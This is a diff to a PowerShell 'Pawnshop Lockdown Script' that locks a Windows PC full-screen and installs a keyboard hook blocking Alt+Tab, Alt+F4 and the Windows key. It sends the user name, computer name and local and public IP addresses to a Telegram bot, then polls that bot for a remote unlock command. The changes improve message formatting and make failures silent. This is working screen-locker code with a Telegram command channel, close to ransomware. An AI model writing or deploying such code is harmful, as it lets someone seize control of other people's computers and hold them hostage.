@@ -1,6 +1,6 @@
 # ==========================
-# Pawnshop Lockdown Script v2.3
-# Fully working Telegram + Fullscreen Lock + Key Blocking
+# Pawnshop Lockdown Script v2.4
+# Telegram Reliable + Key Blocking Improvements
 # ==========================
 
 # SETTINGS
@@ -25,7 +25,7 @@ function Send-Telegram-Message {
 
     try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }
 
-    $message = "🔒 PC-ul $user ($pc) a fost blocat.nIP: $ipLocal | $ipPublicnnDeblocare: $unlockCommand"
+    $message = "🔒 PC-ul $user ($pc) a fost blocat.`nIP: $ipLocal | $ipPublic`n`nDeblocare: $unlockCommand"
     $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
     Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
 }
@@ -79,11 +79,10 @@ public class KeyBlocker {
                 if (vkCode == 0x12) altPressed = true; // ALT
                 if (vkCode == 0x5B || vkCode == 0x5C) winPressed = true; // LWin or RWin
 
-                // Block combinations
                 if ((vkCode == 0x09 && altPressed) || // Alt+Tab
                     (vkCode == 0x73 && altPressed) || // Alt+F4
                     (vkCode == 0x09 && winPressed) || // Win+Tab
-                    vkCode == 0x5B || vkCode == 0x5C)  // Win key alone
+                    vkCode == 0x5B || vkCode == 0x5C)  // Win key
                     return (IntPtr)1;
             }
             if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
@@ -130,11 +129,13 @@ $timer.Add_Tick({
         $response = Invoke-RestMethod $url -UseBasicParsing -TimeoutSec 5
         foreach ($update in $response.result) {
             $offset = $update.update_id + 1
-            if ($update.message.text -eq $unlockCommand) {
+            if ($update.message -and $update.message.text -eq $unlockCommand) {
                 [System.Windows.Forms.Application]::Exit()
             }
         }
-    } catch { }
+    } catch {
+        # silently fail and continue
+    }
 })
 $timer.Start()
 
